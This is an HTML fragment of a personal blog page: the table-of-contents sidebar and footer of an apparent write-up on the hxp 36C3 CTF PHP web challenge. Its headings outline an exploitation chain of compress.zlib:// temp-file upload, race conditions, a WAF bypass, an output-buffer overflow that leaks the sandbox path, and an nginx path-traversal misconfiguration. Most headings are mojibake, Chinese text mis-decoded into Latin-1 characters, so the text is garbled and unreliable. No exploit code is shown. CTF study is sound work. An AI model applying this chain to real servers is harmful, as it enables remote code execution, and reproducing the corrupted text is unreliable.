href="#é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨compress-zlib-æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚"><span class="nav-number">1.0.3.9.</span> <span class="nav-text">é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨compress.zlib://æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åœ¨php-srcæºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°php-stream-gzopen"><span class="nav-number">1.0.3.10.</span> <span class="nav-text">åœ¨php-srcæºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°php_stream_gzopen</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ext-zlib-zlib-fopen-wrapper-c"><span class="nav-number">1.0.3.11.</span> <span class="nav-text">ext/zlib/zlib_fopen_wrapper.c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½STREAM-WILL-CASTï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨main-php-streams-hå®šä¹‰äº†è¯¥æ ‡å¿—ä½"><span class="nav-number">1.0.3.12.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½STREAM_WILL_CASTï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨main/php_streams.hå®šä¹‰äº†è¯¥æ ‡å¿—ä½:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°†streamè½¬æ¢æˆFILE-çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚"><span class="nav-number">1.0.3.13.</span> <span class="nav-text">å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°†streamè½¬æ¢æˆFILE*çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ¥ç€æˆ‘ä»¬è·Ÿè¿›php-stream-open-wrapper-exå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨main-php-streams-hä¸­è¢«defineä¸º-php-stream-open-wrapper-exã€‚"><span class="nav-number">1.0.3.14.</span> <span class="nav-text">æ¥ç€æˆ‘ä»¬è·Ÿè¿›php_stream_open_wrapper_exå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨main/php_streams.hä¸­è¢«defineä¸º_php_stream_open_wrapper_exã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¯¥å‡½æ•°è°ƒç”¨äº†php-stream-make-seekable-relï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†STREAM-WILL-CASTå‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›php-stream-make-seekable-relå‡½æ•°ï¼Œå®ƒåœ¨main-php-streams-hä¸­è¢«defineä¸º-php-stream-make-seekableï¼Œç»§ç»­è·Ÿè¿›"><span class="nav-number">1.0.3.15.</span> <span class="nav-text">è¯¥å‡½æ•°è°ƒç”¨äº†php_stream_make_seekable_relï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†STREAM_WILL_CASTå‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›php_stream_make_seekable_relå‡½æ•°ï¼Œå®ƒåœ¨main/php_streams.hä¸­è¢«defineä¸º_php_stream_make_seekableï¼Œç»§ç»­è·Ÿè¿›</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-streams-cast-c"><span class="nav-number">1.0.3.16.</span> <span class="nav-text">main/streams/cast.c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœflagsä¸PHP-STREAM-PREFER-STDIOéƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€ŒPHP-STREAM-PREFER-STDIOåœ¨main-php-streams-hä¸­å·²ç»è¢«defineã€‚"><span class="nav-number">1.0.3.17.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœflagsä¸PHP_STREAM_PREFER_STDIOéƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€ŒPHP_STREAM_PREFER_STDIOåœ¨main/php_streams.hä¸­å·²ç»è¢«defineã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬åªéœ€è¦å…³å¿ƒflagsçš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šflagsçš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥flagsçš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†php-stream-fopen-tmpfileå‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚"><span class="nav-number">1.0.3.18.</span> <span class="nav-text">æˆ‘ä»¬åªéœ€è¦å…³å¿ƒflagsçš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šflagsçš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥flagsçš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†php_stream_fopen_tmpfileå‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨pwntoolsèµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶"><span class="nav-number">1.0.3.19.</span> <span class="nav-text">äºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨pwntoolsèµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨fswatchå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚"><span class="nav-number">1.0.3.20.</span> <span class="nav-text">è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨fswatchå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Keep-Temp-File"><span class="nav-number">1.0.3.21.</span> <span class="nav-text">Keep Temp File</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢«phpåˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚"><span class="nav-number">1.0.3.22.</span> <span class="nav-text">ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢«phpåˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š"><span class="nav-number">1.0.3.23.</span> <span class="nav-text">æ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Bypass-Waf"><span class="nav-number">1.0.3.24.</span> <span class="nav-text">Bypass Waf</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚"><span class="nav-number">1.0.3.25.</span> <span class="nav-text">æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œå¹¶ä¸”å‚è€ƒäº†ä¸»è¦çš„å…¬å¼€WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚"><span class="nav-number">1.0.3.26.</span> <span class="nav-text">è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼Œå¹¶ä¸”å‚è€ƒäº†ä¸»è¦çš„å…¬å¼€WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡striposçš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰PHPä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨HTTPé•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰PHPä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿include-onceåŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚"><span class="nav-number">1.0.3.27.</span> <span class="nav-text">ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡striposçš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰PHPä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨HTTPé•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰PHPä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿include_onceåŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚"><span class="nav-number">1.0.3.28.</span> <span class="nav-text">å› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Leak-Dir-path"><span class="nav-number">1.0.3.29.</span> <span class="nav-text">Leak Dir path</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚"><span class="nav-number">1.0.3.30.</span> <span class="nav-text">æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„sandboxè·¯å¾„ã€‚"><span class="nav-number">1.0.3.31.</span> <span class="nav-text">è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„sandboxè·¯å¾„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„nameå‚æ•°ï¼Œå¯¼è‡´PHP-output-bufferæº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š"><span class="nav-number">1.0.3.32.</span> <span class="nav-text">æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„nameå‚æ•°ï¼Œå¯¼è‡´PHP output bufferæº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#GET-Flag"><span class="nav-number">1.0.3.33.</span> <span class="nav-text">GET Flag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š"><span class="nav-number">1.0.3.34.</span> <span class="nav-text">æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-åˆ©ç”¨compress-zlib-http-æˆ–è€…compress-zlib-ftp-æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ-HTTP-é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶"><span class="nav-number">1.0.3.35.</span> <span class="nav-text">1.åˆ©ç”¨compress.zlib://http://æˆ–è€…compress.zlib://ftp://æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ HTTP é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-åˆ©ç”¨è¶…é•¿çš„-name-æº¢å‡º-output-buffer-å¾—åˆ°-sandbox-è·¯å¾„"><span class="nav-number">1.0.3.36.</span> <span class="nav-text">2.åˆ©ç”¨è¶…é•¿çš„ name æº¢å‡º output buffer å¾—åˆ° sandbox è·¯å¾„</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-åˆ©ç”¨-Nginx-é…ç½®é”™è¯¯ï¼Œé€šè¿‡-well-known-files-sandbox-æ¥è·å–æˆ‘ä»¬-tmp-æ–‡ä»¶çš„æ–‡ä»¶å"><span class="nav-number">1.0.3.37.</span> <span class="nav-text">3.åˆ©ç”¨ Nginx é…ç½®é”™è¯¯ï¼Œé€šè¿‡.well-known../files/sandbox/æ¥è·å–æˆ‘ä»¬ tmp æ–‡ä»¶çš„æ–‡ä»¶å</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„-tmp-æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰-PHP-ä»£ç "><span class="nav-number">1.0.3.38.</span> <span class="nav-text">4.å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„ tmp æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰ PHP ä»£ç </span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-ç»•è¿‡-WAF-åˆ¤æ–­åï¼Œå‘é€-PHP-ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„-PHP-ä»£ç æ‹¿åˆ°-Flag"><span class="nav-number">1.0.3.39.</span> <span class="nav-text">5.ç»•è¿‡ WAF åˆ¤æ–­åï¼Œå‘é€ PHP ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„ PHP ä»£ç æ‹¿åˆ° Flag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹-æ¥è‡ª-wupco-ï¼š"><span class="nav-number">1.0.3.40.</span> <span class="nav-text">æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹(æ¥è‡ª @wupco)ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ"><span class="nav-number">1.0.3.41.</span> <span class="nav-text">è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¼ å…¥nameè¿‡å¤§-overflow-output-bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„"><span class="nav-number">1.0.3.42.</span> <span class="nav-text">ä¼ å…¥nameè¿‡å¤§ overflow output bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡file-get-contentsè·å–çš„å†…å®¹ä¸å¸¦æœ‰-lt-includeçš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ"><span class="nav-number">1.0.3.43.</span> <span class="nav-text">tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡file_get_contentsè·å–çš„å†…å®¹ä¸å¸¦æœ‰&lt;?,includeçš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#well-known-files-æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶"><span class="nav-number">1.0.3.44.</span> <span class="nav-text">.well-known../files/æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰-hit-ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡-rebirth-çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥-getflag"><span class="nav-number">1.0.3.45.</span> <span class="nav-text">ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰ hit ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡ @rebirth çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥ getflag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp-py"><span class="nav-number">1.0.3.46.</span> <span class="nav-text">exp.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å‚è€ƒçš„exp"><span class="nav-number">1.0.3.47.</span> <span class="nav-text">å‚è€ƒçš„exp</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#References"><span class="nav-number">1.0.4.</span> <span class="nav-text">References</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-zeddyu-info-2020-01-08-36c3-web"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">https://blog.zeddyu.info/2020/01/08/36c3-web/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#20191228-hxp36c3ctf"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">20191228-hxp36c3ctf</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-paste-q3k-org-paste-mp0iN5mw-xy-cOL-ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-ctftime-org-task-10211"><span class="nav-number">1.0.4.4.</span> <span class="nav-text">https://ctftime.org/task/10211</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
